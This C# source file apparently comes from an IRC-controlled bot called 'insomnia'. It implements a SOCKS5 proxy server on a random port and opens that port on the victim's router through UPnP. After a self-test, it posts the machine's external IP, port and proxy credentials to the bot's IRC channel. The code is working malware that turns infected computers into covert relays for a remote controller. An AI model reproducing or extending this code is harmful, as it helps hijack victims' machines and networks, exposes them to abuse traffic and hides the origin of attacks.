using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using UPNPLib;

namespace insomnia
{
    [StructLayout(LayoutKind.Sequential)]
    public struct M
    {
        public ushort externalPort;
        public ushort internalPort;
        public string protocol;
        public string description;
    }

    internal class consess
    {
        TcpClient internClient;
        TcpClient externClient;
        byte SOCKS_VERSION = 5;
        byte SOCKS_AUTH = 2;
        byte SOCKS_REPLYSUCCESS = 0;
        byte SOCKS_IPV4ADDR = 1;
        byte SOCKS_DNSNAME = 3;

        public consess(TcpClient client)
        {
            //socksClient = LOKAL PC ZU LOKAL PROXY
            internClient = client;
        }

        public void Work()
        {
            NetworkStream socksClientStream = internClient.GetStream();

            byte[] authFields = new byte[2];
            socksClientStream.Read(authFields, 0, 2);
            //Console.WriteLine(string.Format("authFields: version {0} methods {1}", authFields[0], authFields[1]));
            byte[] methods = new byte[authFields[1]];
            socksClientStream.Read(methods, 0, methods.Length);
            //Console.WriteLine("socks client supports " + methods.Length.ToString() + " methods");


            //Select Auth Typ
            byte[] selectedAuthMethod = { SOCKS_VERSION, SOCKS_AUTH };
            socksClientStream.Write(selectedAuthMethod, 0, 2);

            //Auth 

            System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
            byte[] Name = new byte[64];
            socksClientStream.Read(Name, 0, 64);
            int Version = Convert.ToInt32(Name[0]);
            int UserLength = Convert.ToInt32(Name[1]);
            int PassLength = Convert.ToInt32(Name[UserLength + 2]);

            byte[] UserName = new byte[UserLength];

            for (int i = 0; i <= UserLength - 1; i++)
            {
                UserName[i] = Name[i + 2];
            }

            byte[] PwByte = new byte[PassLength];

            for (int i = 0; i <= PassLength - 1; i++)
            {
                PwByte[i] = Name[i + UserLength + 3];
            }

            string UserSTRING = enc.GetString(UserName);
            string PwSTRING = enc.GetString(PwByte);

            if (UserSTRING.Equals(Config.socksUser) && PwSTRING.Equals(Config.socksPass))
            {
                byte[] Succes = { SOCKS_VERSION, SOCKS_REPLYSUCCESS };
                socksClientStream.Write(Succes, 0, 2);
            }
            else
            {
                byte[] Succes = { SOCKS_VERSION, 2 };
                socksClientStream.Write(Succes, 0, 2);
            }

            //
            byte[] requestFields = new byte[4];
            socksClientStream.Read(requestFields, 0, 4);
            //Console.WriteLine("socksclient requests address type "+ requestFields[3].ToString());




            string connection_target = "";
            int target_port;
            if (requestFields[3] == SOCKS_IPV4ADDR)
            {
                //get ip address
                byte[] target_data = new byte[4];
                socksClientStream.Read(target_data, 0, 4);
                IPAddress ip = new IPAddress(target_data);
                connection_target = ip.ToString();
            }
            else if (requestFields[3] == SOCKS_DNSNAME)
            {
                //domainname requested
                //doc: byteorder
                byte[] domainname_length = new byte[1];
                // read the following domain name length
                socksClientStream.Read(domainname_length, 0, 1);
                byte[] target_data = new byte[domainname_length[0]];
                // read a domain name of requseted length
                socksClientStream.Read(target_data, 0, domainname_length[0]);
                //interpret the domainname in default encoding
                connection_target = Encoding.Default.GetString(target_data);
            }
            else
            {
            }

            //if requested address is supported
            if (connection_target != "")
            {

                /* *****************************************************
                * server client connection part
                * ***************************************************** */


                //doc: byteorder
                byte[] bintargetport = new byte[2];
                socksClientStream.Read(bintargetport, 0, 2);
                byte[] tmp_byteorder = new byte[2];
                tmp_byteorder[0] = bintargetport[1];
                tmp_byteorder[1] = bintargetport[0];
                target_port = (int)BitConverter.ToUInt16(tmp_byteorder, 0);
                //Console.WriteLine("requesting " + connection_target + ":" + target_port.ToString());

                externClient = new TcpClient(connection_target, target_port);


                /* *****************************************************
                * reply part
                * ***************************************************** */

                if (externClient.Connected)
                {
                    // reply successful audience
                    byte[] reply = new byte[10];
                    //version
                    reply[0] = SOCKS_VERSION;
                    // replycode
                    reply[1] = SOCKS_REPLYSUCCESS;
                    //reserved and 0
                    reply[2] = 0;
                    // addresstype
                    reply[3] = 1;
                    string ip = externClient.Client.LocalEndPoint.ToString().Split(':')[0];
                    IPAddress ipaddr = IPAddress.Parse(ip);
                    reply[4] = ipaddr.GetAddressBytes()[0];
                    reply[5] = ipaddr.GetAddressBytes()[1];
                    reply[6] = ipaddr.GetAddressBytes()[2];
                    reply[7] = ipaddr.GetAddressBytes()[3];
                    int port = int.Parse(externClient.Client.LocalEndPoint.ToString().Split(':')[1]);
                    // read unsigned integer in networkoctet order
                    reply[8] = BitConverter.GetBytes((UInt16)port)[0];
                    reply[9] = BitConverter.GetBytes((UInt16)port)[1];
                    socksClientStream.Write(reply, 0, 10);
                    //Console.WriteLine("writing reply");

                    /* *****************************************************
                     * tcp redirection
                     * ***************************************************** */
                    try
                    {
                        NetworkStream serverClientStream = externClient.GetStream();
                        bool ioError = false;
                        // forward tcp data till one of the connected endpoints is disconnected
                        while (externClient.Connected && internClient.Connected && !ioError && s5init.socksEnabled)
                        {
                            System.Threading.Thread.Sleep(100);
                            try
                            {
                                if (socksClientStream.DataAvailable)
                                {
                                    byte[] readbuffer = new byte[10000];
                                    int count_read = socksClientStream.Read(readbuffer, 0, 10000);
                                    byte[] read_data = new byte[count_read];
                                    Array.Copy(readbuffer, read_data, count_read);
                                    serverClientStream.Write(read_data, 0, read_data.Length);
                                    //Console.WriteLine("writing " + read_data.Length.ToString() + " to target");
                                }
                                if (serverClientStream.DataAvailable)
                                {
                                    byte[] receivebuffer = new byte[10000];
                                    int count_receive = serverClientStream.Read(receivebuffer, 0, 10000);
                                    byte[] receive_data = new byte[count_receive];
                                    Array.Copy(receivebuffer, receive_data, count_receive);
                                    socksClientStream.Write(receive_data, 0, receive_data.Length);
                                    //Console.WriteLine("writing " + receive_data.Length.ToString() + " to socks initiator");
                                }
                            }
                            catch
                            {
                                ioError = true;
                            }
                        }

                    }
                    catch
                    {
                    }
                    // try to close connections if yet connected
                    if (internClient.Connected)
                        internClient.Close();
                    if (externClient.Connected)
                        externClient.Close();
                }
                else
                {
                }
            }
            else
            {
            }
        }
    }

    internal class Network
    {
        public static IPAddress FindIPAddress(bool localPreference)
        {
            return FindIPAddress(Dns.GetHostEntry(Dns.GetHostName()), localPreference);
        }

        public static IPAddress FindIPAddress(IPHostEntry host, bool localPreference)
        {
            if (host == null)
            {
                throw new ArgumentNullException("host");
            }
            if (host.AddressList.Length != 1)
            {
                foreach (IPAddress address in host.AddressList)
                {
                    bool flag = IsLocal(address);
                    if (flag && localPreference)
                    {
                        return address;
                    }
                    if (!(flag || localPreference))
                    {
                        return address;
                    }
                }
            }
            return host.AddressList[0];
        }

        public static bool IsLocal(IPAddress address)
        {
            if (address == null)
            {
                throw new ArgumentNullException("address");
            }
            byte[] addressBytes = address.GetAddressBytes();
            return (((addressBytes[0] == 10) || ((addressBytes[0] == 0xc0) && (addressBytes[1] == 0xa8))) || (((addressBytes[0] == 0xac) && (addressBytes[1] >= 0x10)) && (addressBytes[1] <= 0x1f)));
        }
    }

    internal class s5init
    {
        static Random Rdm = new Random();
        public static int Port = Convert.ToInt32(Rdm.Next(2000, 20000));
        public static string upnp = "no";
        public static bool socksGood = false;

        public static string socksDetails()
        {
            return "Listening on:" + IRC.ColorCode(" " + Functions.externalIP) + " :" + IRC.ColorCode(" " + Port) + ", Username:" + IRC.ColorCode(" " + Config.socksUser) + ", Password:" + IRC.ColorCode(" " + Config.socksPass) + ", uPnP:" + IRC.ColorCode(" " + upnp) + ".";
        }

        public static bool socksEnabled = false;

        public static void StopSocks()
        {
            socksEnabled = false;
        }

        public static void StartSocks()
        {
            new Thread(StartUpnp).Start();
            Thread.Sleep(5000);

            socksEnabled = true;
            new Thread(Listen).Start();
            new Thread(CheckSocks).Start();
        }

        public static void Listen()
        {
            TcpListener server = new TcpListener(Port);
            server.Start();

            while (socksEnabled)
            {
                TcpClient client = server.AcceptTcpClient();
                consess S = new consess(client);
                Thread T = new Thread(new ThreadStart(S.Work));
                T.Start();
            }

            server.Stop();
        }

        public static void StartUpnp()
        {
            try
            {
                UPnP.Discover();
                UPnP.MapPort(Port, Port, "TCP", Config.randomID);
                upnp = "yes";
            }
            catch { }
        }

        public static void CheckSocks()
        {
            Thread.Sleep(10000);
            try
            {
                Socket client = SocksProxy.s5connect(Functions.externalIP, Port, "www.google.com", 80, Config.socksUser, Config.socksPass);
                IRC.WriteMessage(socksDetails(), Config._mainChannel());
                socksGood = true;
            }
            catch
            {
            }
        }
    }

    internal class SocksProxy
    {

        private SocksProxy() { }

        public static Socket s5connect(string proxyAdress, int proxyPort, string destAddress, ushort destPort,
            string userName, string password)
        {
            IPAddress destIP = null;
            IPAddress proxyIP = null;
            byte[] request = new byte[257];
            byte[] response = new byte[257];
            ushort nIndex;

            try
            {
                proxyIP = IPAddress.Parse(proxyAdress);
            }
            catch (FormatException)
            {	// get the IP address
                proxyIP = Dns.GetHostByAddress(proxyAdress).AddressList[0];
            }

            // Parse destAddress (assume it in string dotted format "212.116.65.112" )
            try
            {
                destIP = IPAddress.Parse(destAddress);
            }
            catch (FormatException)
            {
                // wrong assumption its in domain name format "www.microsoft.com"
            }

            IPEndPoint proxyEndPoint = new IPEndPoint(proxyIP, proxyPort);

            // open a TCP connection to SOCKS server...
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            s.Connect(proxyEndPoint);

            nIndex = 0;
            request[nIndex++] = 0x05; // Version 5.
            request[nIndex++] = 0x02; // 2 Authentication methods are in packet...
            request[nIndex++] = 0x00; // NO AUTHENTICATION REQUIRED
            request[nIndex++] = 0x02; // USERNAME/PASSWORD
            // Send the authentication negotiation request...
            s.Send(request, nIndex, SocketFlags.None);

            // Receive 2 byte response...
            int nGot = s.Receive(response, 2, SocketFlags.None);
            if (nGot != 2)
                throw new Exception();

            if (response[1] == 0xFF)
            {	// No authentication method was accepted close the socket.
                s.Close();
                throw new Exception();
            }

            byte[] rawBytes;

            if (/*response[1]==0x02*/true)
            {//Username/Password Authentication protocol
                nIndex = 0;
                request[nIndex++] = 0x05; // Version 5.

                // add user name
                request[nIndex++] = (byte)userName.Length;
                rawBytes = Encoding.Default.GetBytes(userName);
                rawBytes.CopyTo(request, nIndex);
                nIndex += (ushort)rawBytes.Length;

                // add password
                request[nIndex++] = (byte)password.Length;
                rawBytes = Encoding.Default.GetBytes(password);
                rawBytes.CopyTo(request, nIndex);
                nIndex += (ushort)rawBytes.Length;

                // Send the Username/Password request
                s.Send(request, nIndex, SocketFlags.None);
                // Receive 2 byte response...
                nGot = s.Receive(response, 2, SocketFlags.None);
                if (nGot != 2)
                    throw new Exception();
                if (response[1] != 0x00)
                    throw new Exception();
            }
            // This version only supports connect command. 
            // UDP and Bind are not supported.

            // Send connect request now...
            nIndex = 0;
            request[nIndex++] = 0x05;	// version 5.
            request[nIndex++] = 0x01;	// command = connect.
            request[nIndex++] = 0x00;	// Reserve = must be 0x00

            if (destIP != null)
            {// Destination adress in an IP.
                switch (destIP.AddressFamily)
                {
                    case AddressFamily.InterNetwork:
                        // Address is IPV4 format
                        request[nIndex++] = 0x01;
                        rawBytes = destIP.GetAddressBytes();
                        rawBytes.CopyTo(request, nIndex);
                        nIndex += (ushort)rawBytes.Length;
                        break;
                    case AddressFamily.InterNetworkV6:
                        // Address is IPV6 format
                        request[nIndex++] = 0x04;
                        rawBytes = destIP.GetAddressBytes();
                        rawBytes.CopyTo(request, nIndex);
                        nIndex += (ushort)rawBytes.Length;
                        break;
                }
            }
            else
            {// Dest. address is domain name.
                request[nIndex++] = 0x03;	// Address is full-qualified domain name.
                request[nIndex++] = Convert.ToByte(destAddress.Length); // length of address.
                rawBytes = Encoding.Default.GetBytes(destAddress);
                rawBytes.CopyTo(request, nIndex);
                nIndex += (ushort)rawBytes.Length;
            }

            // using big-edian byte order
            byte[] portBytes = BitConverter.GetBytes(destPort);
            for (int i = portBytes.Length - 1; i >= 0; i--)
                request[nIndex++] = portBytes[i];

            // send connect request.
            s.Send(request, nIndex, SocketFlags.None);
            s.Receive(response);	// Get variable length response...
            if (response[1] != 0x00)
                throw new Exception();
            // Success Connected...
            return s;
        }
    }

    internal class UPnP
    {
        private static IPAddress localAddr = Network.FindIPAddress(true);
        private static UPnPService service = null;

        private static UPnPService CheckDevice(UPnPDevice device)
        {
            foreach (UPnPService service in device.Services)
            {
                if (CheckService(service))
                {
                    return service;
                }
                if (device.HasChildren)
                {
                    return CheckDevices(device.Children);
                }
            }
            return null;
        }

        private static UPnPService CheckDevices(UPnPDevices devices)
        {
            foreach (UPnPDevice device in devices)
            {
                UPnPService service = CheckDevice(device);
                if (service != null)
                {
                    return service;
                }
            }
            return null;
        }

        private static bool CheckService(UPnPService s)
        {
            return (s.ServiceTypeIdentifier == "urn:schemas-upnp-org:service:WANIPConnection:1");
        }

        public static bool DeleteMap(int externalPort, string protocol)
        {
            if (service == null)
            {
                return false;
            }
            object[] vInActionArgs = new object[] { "", externalPort, protocol };
            object pvOutActionArgs = new object();
            try
            {
                service.InvokeAction("DeletePortMapping", vInActionArgs, ref pvOutActionArgs);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool Discover()
        {
            service = null;
            UPnPDeviceFinder finder = (UPnPDeviceFinder)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("E2085F28-FEB7-404A-B8E7-E659BDEAAA02")));
            service = CheckDevices(finder.FindByType("urn:schemas-upnp-org:device:InternetGatewayDevice:1", 0));
            return (service != null);
        }

        public static string GetExternalIP()
        {
            if (service == null)
            {
                return "";
            }
            object vInActionArgs = new object();
            object pvOutActionArgs = new object();
            service.InvokeAction("GetExternalIPAddress", vInActionArgs, ref pvOutActionArgs);
            object[] objArray = (object[])pvOutActionArgs;
            return (string)objArray[0];
        }

        public static List<M> GetMappings()
        {
            if (service == null)
            {
                return null;
            }
            List<M> list = new List<M>();
            bool flag = false;
            int num = 0;
            while (!flag)
            {
                object[] vInActionArgs = new object[] { num };
                object pvOutActionArgs = new object();
                try
                {
                    service.InvokeAction("GetGenericPortMappingEntry", vInActionArgs, ref pvOutActionArgs);
                    object[] objArray2 = (object[])pvOutActionArgs;
                    num++;
                    M item = new M();
                    item.externalPort = (ushort)objArray2[1];
                    item.internalPort = (ushort)objArray2[3];
                    item.protocol = (string)objArray2[2];
                    item.description = (string)objArray2[6];
                    list.Add(item);
                }
                catch
                {
                    flag = true;
                }
            }
            return list;
        }

        public static bool IsMapped(int externalPort, string protocol)
        {
            if (service == null)
            {
                return false;
            }
            object[] vInActionArgs = new object[] { "", externalPort, protocol };
            object pvOutActionArgs = new object();
            try
            {
                service.InvokeAction("GetSpecificPortMappingEntry", vInActionArgs, ref pvOutActionArgs);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool MapPort(int externalPort, int internalPort, string protocol, string description, int duration = 0)
        {
            if ((service != null) && !IsMapped(externalPort, protocol))
            {
                object[] vInActionArgs = new object[] { "", externalPort, protocol, internalPort, localAddr.ToString(), true, description, duration };
                object pvOutActionArgs = new object();
                try
                {
                    service.InvokeAction("AddPortMapping", vInActionArgs, ref pvOutActionArgs);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
            return false;
        }
    }
}
